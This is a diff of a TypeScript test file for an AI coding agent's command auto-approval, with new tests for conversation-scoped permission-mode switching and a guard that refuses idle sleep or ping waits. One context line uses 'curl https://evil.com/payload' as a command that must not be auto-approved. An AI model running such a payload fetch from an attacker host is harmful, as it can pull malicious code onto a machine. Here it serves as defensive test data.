@@ -12,6 +12,8 @@ import assert from 'node:assert/strict'
 import { test, describe, summaryAsync } from '../../services/__tests__/test-harness'
 import { setupElectronStub } from '../../services/__tests__/electron-stub'
 import { shouldAutoApprove, stripCdPrefix } from '../tool-auto-approve'
+import { resolveBroadcastMode } from '../mode-broadcast'
+import { classifyIdleWait } from '../idle-wait-guard'
 
 setupElectronStub()
 
@@ -250,6 +252,145 @@ describe('shouldAutoApprove — non-Bash shell tools', () => {
       assert.ok(!shouldAutoApprove(tool, { command: 'curl https://evil.com/payload' }, 'plan'))
     })
   }
+})
+
+// ── resolveBroadcastMode ──
+//
+// The server's CONVERSATION_MODE is frozen at spawn, but the CLI child owning it
+// outlives a Plan → Build switch — which is how every shell command in a
+// switched conversation ended up prompting. The broadcast fixes that; these
+// tests pin the guards that stop it from over-applying.
+
+describe('resolveBroadcastMode', () => {
+  const CONV = 'conv-a'
+
+  test('ignores non-modeChange events', () => {
+    assert.equal(
+      resolveBroadcastMode(
+        { type: 'permissionResponse', payload: { mode: 'build', conversationId: CONV } },
+        CONV,
+        'plan'
+      ),
+      'plan'
+    )
+  })
+
+  test('ignores an unknown mode value', () => {
+    assert.equal(
+      resolveBroadcastMode(
+        { type: 'modeChange', payload: { mode: 'yolo', conversationId: CONV } },
+        CONV,
+        'plan'
+      ),
+      'plan'
+    )
+  })
+
+  test('ignores a missing payload', () => {
+    assert.equal(resolveBroadcastMode({ type: 'modeChange' }, CONV, 'plan'), 'plan')
+  })
+
+  test('ignores a broadcast for another conversation', () => {
+    // One bridge serves every conversation in a workspace — cross-applying would
+    // hand chat B chat A's permissions.
+    assert.equal(
+      resolveBroadcastMode(
+        { type: 'modeChange', payload: { mode: 'build', conversationId: 'conv-b' } },
+        CONV,
+        'plan'
+      ),
+      'plan'
+    )
+  })
+
+  test('ignores an unaddressed broadcast when this server has a conversation', () => {
+    assert.equal(
+      resolveBroadcastMode({ type: 'modeChange', payload: { mode: 'build' } }, CONV, 'plan'),
+      'plan'
+    )
+  })
+
+  test('applies a matching conversation broadcast', () => {
+    assert.equal(
+      resolveBroadcastMode(
+        { type: 'modeChange', payload: { mode: 'build', conversationId: CONV } },
+        CONV,
+        'plan'
+      ),
+      'build'
+    )
+  })
+
+  test('applies when neither side carries a conversation id', () => {
+    assert.equal(
+      resolveBroadcastMode({ type: 'modeChange', payload: { mode: 'danger' } }, undefined, 'plan'),
+      'danger'
+    )
+  })
+
+  test('msbuild PowerShell is denied on plan and allowed after the switch', () => {
+    const input = {
+      command: 'msbuild MULLIGAN.sln /t:Rebuild /p:Configuration=Debug'
+    }
+    let mode = 'plan'
+    assert.ok(!shouldAutoApprove('PowerShell', input, mode), 'plan mode should prompt')
+
+    mode = resolveBroadcastMode(
+      { type: 'modeChange', payload: { mode: 'build', conversationId: CONV } },
+      CONV,
+      mode
+    )
+    assert.equal(mode, 'build')
+    assert.ok(shouldAutoApprove('PowerShell', input, mode), 'build mode should auto-approve')
+  })
+})
+
+describe('classifyIdleWait', () => {
+  test('bare_sleep_is_refused', () => {
+    const msg = classifyIdleWait('Bash', { command: 'sleep 999' })
+    assert.ok(msg && msg.includes('wait_process'), 'sleep 999 should be refused')
+    assert.ok(classifyIdleWait('Bash', { command: 'sleep infinity' }))
+    assert.ok(classifyIdleWait('Bash', { command: '  sleep 30s  ' }))
+    assert.ok(classifyIdleWait('Bash', { command: 'cd /tmp && sleep 60' }), 'cd prefix stripped')
+  })
+
+  test('start_sleep_and_timeout_t_are_refused', () => {
+    assert.ok(classifyIdleWait('PowerShell', { command: 'Start-Sleep -Seconds 30' }))
+    assert.ok(classifyIdleWait('PowerShell', { command: 'start-sleep 5' }))
+    assert.ok(classifyIdleWait('Bash', { command: 'timeout /t 30 /nobreak' }))
+    // POSIX `timeout <n> <cmd>` runs real work — must not be refused
+    assert.equal(classifyIdleWait('Bash', { command: 'timeout 30 npm test' }), null)
+  })
+
+  test('ping_localhost_idiom_is_refused', () => {
+    assert.ok(classifyIdleWait('Bash', { command: 'ping -n 30 127.0.0.1' }))
+    assert.ok(classifyIdleWait('PowerShell', { command: 'ping 127.0.0.1 -n 10' }))
+    // A real reachability check has no repeat count — leave it alone
+    assert.equal(classifyIdleWait('Bash', { command: 'ping example.com' }), null)
+  })
+
+  test('a_chained_sleep_is_allowed', () => {
+    assert.equal(classifyIdleWait('Bash', { command: 'sleep 2 && curl localhost:3000' }), null)
+    assert.equal(classifyIdleWait('Bash', { command: 'sleep 2; npm test' }), null)
+    assert.equal(classifyIdleWait('Bash', { command: 'npm test' }), null)
+  })
+
+  test('non_shell_tools_are_ignored', () => {
+    assert.equal(classifyIdleWait('Read', { command: 'sleep 999' }), null)
+    assert.equal(
+      classifyIdleWait('mcp__process-manager__wait_process', { command: 'sleep 5' }),
+      null
+    )
+    assert.equal(classifyIdleWait('Bash', { file_path: 'sleep 999' }), null)
+  })
+
+  test('refusal_precedes_build_mode_auto_approve', () => {
+    const input = { command: 'sleep 999' }
+    // Build mode rule 4 would auto-approve this with no prompt at all…
+    assert.ok(shouldAutoApprove('Bash', input, 'build'), 'build mode allows non-dangerous shell')
+    // …so the guard has to run before it.
+    assert.ok(classifyIdleWait('Bash', input), 'guard must catch what auto-approve would allow')
+  })
 })
 
 if (process.argv[1]?.includes('control-actions-server')) {
